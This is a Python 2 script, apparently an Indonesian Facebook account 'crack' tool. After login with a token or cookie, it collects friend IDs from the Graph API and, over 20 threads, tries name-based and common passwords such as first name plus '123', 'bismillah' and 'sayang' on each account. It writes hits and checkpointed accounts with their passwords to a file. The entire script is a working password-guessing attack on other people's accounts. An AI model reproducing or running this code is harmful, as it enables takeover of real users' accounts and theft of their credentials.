#!/usr/bin/python2
# coding=utf-8
import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 zain4.py")
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'

#### LOADING ####
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\033[0;91m|', '\033[0;97m/', '\033[0;91m-', '\033[0;97m\\']):
        if done:
            break
        sys.stdout.write('\r\033[0;97m︻デ✪═══➽'+ c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

### KELUAR ###
def keluar():
	print ("! Exit")
	os.sys.exit()
	
### JALAN ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
### LOGO ###
logo = ("""
\033[0;91m :::::::::     :::     ::::::::::: ::::    :::                    
\033[0;91m      :+:    :+: :+:       :+:     :+:+:   :+:  
\033[0;91m     +:+    +:+   +:+      +:+     :+:+:+  +:+     
\033[0;91m    +#+    +#++:++#++:     +#+     +#+ +:+ +#+     
\033[0;1m   +#+     +#+     +#+     +#+     +#+  +#+#+#     
\033[0;1m  #+#      #+#     #+#     #+#     #+#   #+#+#    
\033[0;1m ######### ###     ### ########### ###    ####                                                                              
\33[1;91m╔══════════════════════════════════════════╗
\33[1;91m║\033[37;1;1mAuthor\33[1;33m\033[37;1m   : Zamuel Voldemord               \33[1;91m║
\33[1;91m║\033[37;1;1mGithub\33[1;33m\033[37;1m   : Github.com/zamxyz              \33[1;91m║
\33[1;91m║\033[37;1;1mFacebook\33[1;33m\033[37;1m : Facebook.com/zamxyz.gans.01    \33[1;91m║
\33[1;91m╚══════════════════════════════════════════╝ """)

back = 00
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

##### MASUK #####
def masuk():
	os.system('clear')
	print logo
	print 52* ('\033[0;92m');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Login Via Token Facebook');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m2\033[1;91m)\033[0;97m. Login Via Cookie Facebook');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Keluar');time.sleep(0.07)
	print 52* ('\033[0;92m');time.sleep(0.07)
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('\033[0;97m︻デ✪═➽\033[1;91m: \033[0;91m')
	if msuk =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0;91m! Isi Yg Benar"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def login_token():
	os.system('clear')
	print logo
	print 50* '\033[0;97m─'
	toket = raw_input("\033[0;91m•>\033[0;97m Token \033[0;97m:\033[0;91m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;97m[\033[0;31m✓\033[0;97m]\033[0;92m Login Berhasil'
		os.system('clear')
		print logo
		os.system('xdg-open https://github.com/zamxyz')
		menu()
	except KeyError:
		print "\033[0;97m[\033[0;39m!\033[0;97m] \033[1;92mToken Salah !"
		time.sleep(0.01)
		masuk()
		
#### LOGIN COOKIES ####
def login_cookie():
	os.system('clear')
	print logo
	print ("\033[0;97m");time.sleep(0.07)
	try:
		cookie = raw_input("\033[1;91m[\033[1;91m?\033[1;91m]\033[0;37m Cookie \033[0;91m:\033[0;37m ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/533.1 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/533.1', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print '\033[0;92m Login Berhasil'
		time.sleep(2)
	except AttributeError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print '\033[0;91m! Koneksi Bermasalah'
		exit()

#### MENU ####
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[0;96m[!] \033[0;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print (logo);time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	jalan ("\033[0;97m•\033[0;97m WELCOME\033[0;90m =>\033[0;97m " +nama);time.sleep(0.07)
	jalan ("\033[0;97m•\033[0;97m USER ID\033[0;90m =>\033[0;97m " +id);time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Mulai Crack');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Kembali');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_menu()
	
### PILIH MENU ###
def pilih_menu():
	peler = raw_input('\033[0;97m•> \033[1;91m:\033[0;97m ')
	if peler =="":
		print '\033[0;97m ! Isi Yg Benar'
		pilih_menu()
	elif peler == "1":
		crack_teman()
	elif peler == "2":
		crack_teman()
	elif peler == "3":
		crack_teman()
	elif peler == "0":
		print '\033[0;97mMenghaspus Token ...'
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print '\033[0;97m ! Isi Yg Benar'
		pilih_menu()
		
		
##### CRACK TEMAN#####
def crack_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m1\033[1;91m)\033[0;97m. Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m2\033[1;91m)\033[0;97m. Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m3\033[1;91m)\033[0;97m. Crack Dari File');time.sleep(0.07)
	print ('\033[1;91m(\033[0;97m0\033[1;91m)\033[0;97m. Kembali');time.sleep(0.07)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input('\033[0;97m•> \033[1;91m:\033[0;97m ')
	if teak =="":
		print '\033[0;97m! Isi Yg Benar'
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	        idt = raw_input("\033[1;91m(\033[1;37m•\033[1;31m)\033[1;97m ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m(\033[1;37m•\033[1;31m)\033[1;97m Nama : "+op["name"]
		except KeyError:
			print"\033[1;91m[\033[1;97m!\033[1;31m]\033[1;97m ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			publik()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="3":
		os.system('clear')
		print logo
		try:
			print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;97m• \033[0;97mNama File\033[0;97m :\033[0;97m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;97mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;97m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;97mFile tidak ada !'
			raw_input("\n\033[0;97m<\033[0;97mKembali \033[0;97m>")
			publik()
	elif teak =="0" or teak =="0":
		crack_teman()
	else:
		print '\033[0;97m! Isi Yg Benar'
		pilih_indo()
	
	print "\033[1;31m(\033[1;37m•\033[1;91m) \033[1;37mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;31m{\033[1;37m•\033[1;91m) \033[1;37mStarting \033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m(\033[1;97m•\033[1;91m) \033[1;97mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	jalan("\nCrack Sedang Berjalan..." )
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN INDONESIA ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pw = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw
				oke = open('done/indo.txt', 'a')
				oke.write('\n[SIP] '+em+' | '+pw)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw
					cek = open('done/indo.txt', 'a')
					cek.write('\n[CP] '+em+' | '+pw)
					cek.close()
					cekpoint.append(em)
				else:
					pw2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw2
						oke = open('done/indo.txt', 'a')
						oke.write('\n[SIP] '+em+' | '+pw2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw2
							cek = open('done/indo.txt', 'a')
							cek.write('\n[CP] '+em+' | '+pw2)
							cek.close()
							cekpoint.append(em)
						else:
							pw3 = v['last_name'].lower()+'123'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw3
								oke = open('done/indo.txt', 'a')
								oke.write('\n[SIP] '+em+' | '+pw3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw3
									cek = open('done/indo.txt', 'a')
									cek.write('\n[CP] '+em+' | '+pw3)
									cek.close()
									cekpoint.append(em)
								else:
									pw4 = v['first_name']
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw4
										oke = open('done/indo.txt', 'a')
										oke.write('\n[SIP] '+em+' | '+pw4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw4
											cek = open('done/indo.txt', 'a')
											cek.write('\n[CP] '+em+' | '+pw4)
											cek.close()
											cekpoint.append(em)
                                        					else:
                                          					 	pw5 = 'bismillah'
                                           					 	rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
                                          					  	xo = rex.content
                                          					  	if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                            					    		print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw5
                                           				     			oke = open('done/indo.txt', 'a')
                                             			   				oke.write('\n[SIP] '+em+' | '+pw5)
                                             			   				oke.close()
                                             				   			oks.append(em)
                                         				   		else:
                                          				      			if 'checkpoint' in xo:
                                            			        				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw5
                                             			       					cek = open('done/indo.txt', 'a')
                                              			      					cek.write('\n[CP] '+em+' | '+pw5)
									    				cek.close()
									    				cekpoint.append(em)
                                              				  			else:
                                               			     					pw6 = 'sayang'
                                               				     				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; Karbonn A18+ Bulid/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/533.1 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"})
                                                			    				xo = rex.content
                                                			    				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                                  				      				print '\033[0;97m[SIP]\033[0;97m '+em+' \033[0;97m| \033[0;97m'+pw6
                                                  			      					oke = open('done/indo.txt', 'a')
                                                 			       					oke.write('\n[SIP] '+em+' | '+pw6)
                                                 			       					oke.close()
                                                  			         				oks.append(em)
                                                 			   				else:
                                                  				      				if 'checkpoint' in xo:
                                                   				         				print '\033[0;97m[CP]\033[0;97m '+em+' \033[0;97m|\033[0;97m '+pw6
                                                    			        					cek = open('done/indo.txt', 'a')
                                                    			        					cek.write('\n[CP] '+em+' | '+pw6)
                                                     				       					cek.close()
										    					cekpoint.append(em)
                                                      			
                                                      			      					
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;97m────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;97m• \033[0;97mSelesai ...'
	print"\033[0;97m• \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(cekpoint))
	print '\033[0;97m• \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/indo.txt'
	print 50* "\033[0;97m─"
	raw_input("\033[0;97m< \033[0;97mKembali\033[0;97m >")
	os.system("python2 zain.py")
	
if __name__=='__main__':
	menu()
	masuk()
